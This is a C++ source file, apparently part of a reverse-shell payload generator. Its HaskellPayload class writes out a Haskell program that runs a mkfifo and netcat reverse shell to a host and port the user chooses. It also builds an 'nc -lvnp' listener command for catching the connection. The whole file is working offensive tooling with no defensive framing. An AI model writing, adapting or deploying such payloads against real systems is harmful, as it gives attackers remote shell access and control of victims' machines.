#include "Haskell_Payload.h"
#include "../../listeners/ListenerFactory.h"

#include <sstream>
#include <string>
std::string HaskellPayload::name() const {
return "haskell";
}

std::string HaskellPayload::generate(const Options& opts) const {
    std::ostringstream ss;
    ss << "module Main where\n\n"
       << "import System.Process\n\n"
       << "main = call Command \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | " << opts.interpreter << " -i 2>&1 | nc " << opts.host << " " << std::to_string(opts.port) << " >/tmp/f\"";
    return ss.str();
}

std::string HaskellPayload::listener(const Options& opts) const {
    ListenerFactory factory;
    IListener* listener = factory.get(opts.listenerType);
    return listener ? listener->command(opts) : "nc -lvnp " + std::to_string(opts.port);
}